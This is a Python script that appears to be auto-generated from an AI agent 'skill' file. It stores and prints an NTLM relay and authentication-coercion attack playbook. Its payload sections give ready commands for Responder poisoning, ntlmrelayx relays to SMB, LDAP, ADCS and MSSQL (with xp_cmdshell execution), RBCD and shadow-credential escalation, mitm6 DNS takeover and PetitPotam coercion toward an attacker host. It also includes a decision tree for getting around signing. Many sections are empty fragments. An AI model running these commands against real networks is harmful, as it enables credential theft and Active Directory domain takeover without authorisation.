#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
AUTO-GENERATED from Cybermes skill: hack-skills/ntlm-relay-coercion

Skill: SKILL: NTLM Relay and Authentication Coercion — Expert Attack Playbook
Desc : >-

Run:  python hack-skills-ntlm-relay-coercion.py --help
      python hack-skills-ntlm-relay-coercion.py --list
      python hack-skills-ntlm-relay-coercion.py --dump <section>
"""
import sys, json, argparse

NAME = 'hack-skills/ntlm-relay-coercion'
TITLE = 'SKILL: NTLM Relay and Authentication Coercion — Expert Attack Playbook'
DESCRIPTION = '>-'

PAYLOADS = {
    'main': ["name: ntlm-relay-coercion", "description: >-", "NTLM relay and authentication coercion playbook. Use when capturing and relaying NTLM authentication to escalate privileges via SMB, LDAP, HTTP, or MSSQL relay targets, combined with PetitPotam, PrinterBug, and other coercion methods."],
    'skill-ntlm-relay-and-authentication-coercion-expert-attack-playbook': [],
    '0-related-routing': ["Before going deep, consider loading:", "- [active-directory-certificate-services](../active-directory-certificate-services/SKILL.md) for ESC8 (relay to ADCS enrollment)", "- [active-directory-acl-abuse](../active-directory-acl-abuse/SKILL.md) for ACL modification via LDAP relay (RBCD, shadow creds)", "- [active-directory-kerberos-attacks](../active-directory-kerberos-attacks/SKILL.md) for Kerberos attacks after relay success", "- [windows-lateral-movement](../windows-lateral-movement/SKILL.md) for post-relay lateral movement"],
    'advanced-reference': ["Also load [COERCION_METHODS.md](./COERCION_METHODS.md) when you need:", "- Detailed coercion method comparison (PetitPotam, PrinterBug, DFSCoerce, etc.)", "- RPC function-level details and prerequisites", "- Coercer tool usage and discovery"],
    '1-ntlm-relay-fundamentals': ["Victim          Attacker (relay)         Target", "\u2502                 \u2502                      \u2502", "\u2502\u2500\u2500 NTLM Auth \u2500\u2500\u2192\u2502                      \u2502  (1) Victim authenticates (coerced/poisoned)", "\u2502                 \u2502\u2500\u2500 Forward Auth \u2500\u2500\u2500\u2500\u2500\u2192\u2502  (2) Attacker relays to target", "\u2502                 \u2502\u2190\u2500 Challenge \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 \u2502  (3) Target sends challenge", "\u2502\u2190\u2500 Challenge \u2500\u2500\u2500\u2500\u2502                      \u2502  (4) Attacker forwards challenge to victim", "\u2502\u2500\u2500 Response \u2500\u2500\u2500\u2500\u2192\u2502                      \u2502  (5) Victim computes response", "\u2502                 \u2502\u2500\u2500 Forward Response \u2500\u2192\u2502  (6) Attacker relays response to target", "\u2502                 \u2502\u2190\u2500 Authenticated! \u2500\u2500\u2500\u2500\u2502  (7) Target accepts \u2192 attacker has session"],
    'ntlmv1-vs-ntlmv2': [],
    '2-relay-target-matrix': [],
    'signing-check': ["```bash"],
    'check-smb-signing-on-target': ["crackmapexec smb TARGET_IP --gen-relay-list relay_targets.txt"],
    'outputs-hosts-without-required-smb-signing': [],
    'nmap-smb-signing-check': ["nmap -p 445 --script smb2-security-mode TARGET_RANGE"],
    '3-responder-credential-capture': [],
    'llmnr-nbt-ns-wpad-mdns-poisoning': ["```bash"],
    'start-responder-capture-mode-don-t-relay-just-capture-hashes': ["responder -I eth0 -dwP"],
    'analyze-mode-passive-no-poisoning': ["responder -I eth0 -A"],
    'key-protocols-poisoned': [],
    'llmnr-udp-5355-link-local-multicast-name-resolution': [],
    'nbt-ns-udp-137-netbios-name-service': [],
    'wpad-web-proxy-auto-discovery-proxy-config': [],
    'mdns-udp-5353-multicast-dns': [],
    'responder-relay-don-t-capture-relay-instead': ["```bash"],
    'disable-http-and-smb-servers-in-responder-ntlmrelayx-will-handle-them': [],
    'edit-etc-responder-responder-conf-set-http-and-smb-to-off': [],
    'start-responder-for-poisoning-only': ["responder -I eth0 -dwP"],
    'start-ntlmrelayx-for-relay': ["ntlmrelayx.py -tf targets.txt -smb2support"],
    '4-ntlmrelayx-relay-execution': [],
    'relay-to-smb-admin-execution': ["```bash"],
    'execute-command-on-targets-requires-admin-privs-on-target': ["ntlmrelayx.py -tf targets.txt -smb2support -c \"whoami\""],
    'dump-sam-hashes': ["ntlmrelayx.py -tf targets.txt -smb2support"],
    'interactive-socks-proxy-maintain-sessions': ["ntlmrelayx.py -tf targets.txt -smb2support -socks"],
    'then-proxychains-smbclient-target-c-u-domain-user': [],
    'relay-to-ldap-acl-modification': ["```bash"],
    'automatic-rbcd-delegate-access': ["ntlmrelayx.py -t ldap://DC_IP --delegate-access -smb2support"],
    'escalate-via-shadow-credentials': ["ntlmrelayx.py -t ldap://DC_IP --shadow-credentials -smb2support"],
    'add-computer-account': ["ntlmrelayx.py -t ldap://DC_IP --add-computer FAKE01 P@ss123 -smb2support"],
    'dump-domain-info': ["ntlmrelayx.py -t ldap://DC_IP -smb2support --dump-domain"],
    'relay-to-adcs-http-esc8': ["```bash", "ntlmrelayx.py -t http://CA_HOST/certsrv/certfnsh.asp -smb2support \\", "--adcs --template DomainController"],
    'use-with-coercion-to-relay-dc-auth-get-dc-certificate': [],
    'relay-to-mssql': ["```bash", "ntlmrelayx.py -t mssql://SQL_HOST -smb2support -q \"SELECT system_user; EXEC xp_cmdshell 'whoami'\""],
    '5-mitm6-ipv6-dns-takeover': ["```bash"],
    'mitm6-exploits-ipv6-auto-configuration-to-become-dns-server': ["mitm6 -d domain.com"],
    'combined-with-ntlmrelayx': ["ntlmrelayx.py -6 -t ldap://DC_IP -wh fake-wpad.domain.com --delegate-access -smb2support"],
    'flow': [],
    '1-mitm6-sends-dhcpv6-replies-victim-gets-attacker-as-ipv6-dns': [],
    '2-victim-queries-wpad-attacker-responds': [],
    '3-ntlm-auth-triggered-relayed-to-ldap': [],
    '4-rbcd-or-shadow-credentials-set-on-victim-computer': [],
    '6-cross-protocol-relay': [],
    'smb-ldap': ["Capture SMB authentication, relay to LDAP (requires no LDAP signing enforcement).", "```bash"],
    'coerce-smb-auth-from-dc-relay-to-ldap-on-same-or-different-dc': ["ntlmrelayx.py -t ldap://DC02_IP --delegate-access -smb2support"],
    'trigger-coercion-attacker-receives-smb-auth': ["PetitPotam.py ATTACKER_IP DC01_IP", "**Limitation**: SMB \u2192 LDAP relay fails if the source uses SMB signing negotiation that indicates relay."],
    'webdav-ldap': ["WebDAV from workstations sends NTLM over HTTP \u2192 relay to LDAP (no signing issues).", "```bash"],
    'webdav-coercion-sends-http-based-ntlm-no-smb-signing-concern': ["ntlmrelayx.py -t ldap://DC_IP --delegate-access -smb2support"],
    'coerce-via-webdav-workstation-must-have-webclient-service-running': [],
    'use-attacker-port-format-to-force-webdav': ["PetitPotam.py ATTACKER@80/test WORKSTATION_IP"],
    '7-webdav-based-coercion': ["WebClient service (WebDAV) converts SMB-type coercion to HTTP-based NTLM.", "```bash"],
    'check-if-webclient-is-running-port-80-listener-or-service-query': ["crackmapexec smb TARGET -u user -p pass -M webdav"],
    'start-webdav-coercion-from-workstation-not-server': [],
    'force-target-to-authenticate-via-http': [],
    'use-unc-path-format-attacker-port-share': ["**Key advantage**: HTTP-based NTLM avoids SMB signing requirements."],
    '8-ntlm-relay-decision-tree': ["Want to relay NTLM authentication", "\u251c\u2500\u2500 What auth can you capture?", "\u2502   \u251c\u2500\u2500 Responder poisoning (passive, wait for queries)", "\u2502   \u251c\u2500\u2500 mitm6 (DHCPv6 DNS takeover, periodic)", "\u2502   \u2514\u2500\u2500 Active coercion \u2192 load COERCION_METHODS.md", "\u251c\u2500\u2500 What target to relay to?", "\u2502   \u2502", "\u2502   \u251c\u2500\u2500 Need code execution?", "\u2502   \u2502   \u251c\u2500\u2500 SMB target without signing \u2192 ntlmrelayx to SMB (\u00a74)", "\u2502   \u2502   \u2514\u2500\u2500 MSSQL target \u2192 ntlmrelayx to MSSQL + xp_cmdshell (\u00a74)", "\u2502   \u2502", "\u2502   \u251c\u2500\u2500 Need domain escalation?", "\u2502   \u2502   \u251c\u2500\u2500 LDAP signing not enforced?", "\u2502   \u2502   \u2502   \u251c\u2500\u2500 Relay to LDAP \u2192 RBCD (\u00a74)", "\u2502   \u2502   \u2502   \u251c\u2500\u2500 Relay to LDAP \u2192 shadow credentials (\u00a74)", "\u2502   \u2502   \u2502   \u2514\u2500\u2500 Relay to LDAP \u2192 add computer + delegate (\u00a74)", "\u2502   \u2502   \u2514\u2500\u2500 LDAP signing enforced?", "\u2502   \u2502       \u2514\u2500\u2500 Relay to ADCS HTTP (ESC8) \u2192 certificate (\u00a74)", "\u2502   \u2502", "\u2502   \u2514\u2500\u2500 Need certificate?", "\u2502       \u2514\u2500\u2500 Relay to ADCS HTTP/RPC \u2192 ESC8/ESC11 (\u00a74)", "\u251c\u2500\u2500 Source is SMB-based?", "\u2502   \u251c\u2500\u2500 Target is SMB \u2192 check signing (\u00a72)", "\u2502   \u251c\u2500\u2500 Target is LDAP \u2192 may work (cross-protocol, \u00a76)", "\u2502   \u2514\u2500\u2500 Target is HTTP \u2192 works (cross-protocol)", "\u251c\u2500\u2500 Source is HTTP-based (WebDAV)?", "\u2502   \u2514\u2500\u2500 Relay to any target (no signing issues, \u00a76/\u00a77)", "\u2514\u2500\u2500 Relay fails?", "\u251c\u2500\u2500 Check signing requirements (\u00a72)", "\u251c\u2500\u2500 Check EPA/channel binding", "\u251c\u2500\u2500 Try cross-protocol (SMB \u2192 LDAP)", "\u2514\u2500\u2500 Try WebDAV coercion (avoids SMB signing)"],
}

def main():
    ap = argparse.ArgumentParser(description=DESCRIPTION, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--list", action="store_true", help="list sections")
    ap.add_argument("--dump", metavar="SECTION", help="dump payloads for a section")
    ap.add_argument("--search", metavar="KEYWORD", help="search payloads")
    args = ap.parse_args()
    if args.list or not (args.dump or args.search):
        print("=== %s ===" % TITLE)
        print(DESCRIPTION)
        print()
        print("Sections (%d):" % len(PAYLOADS))
        for k in PAYLOADS:
            print("  -", k, "(%d payloads)" % len(PAYLOADS[k]))
        if args.list:
            return
    if args.dump:
        if args.dump not in PAYLOADS:
            print("Section not found. Available:", list(PAYLOADS.keys()))
            sys.exit(1)
        for p in PAYLOADS[args.dump]:
            print(p)
        return
    if args.search:
        q = args.search.lower()
        hits = 0
        for k, v in PAYLOADS.items():
            for p in v:
                if q in p.lower():
                    print("[%s] %s" % (k, p))
                    hits += 1
        print("\n%d hits" % hits)
        return

if __name__ == "__main__":
    main()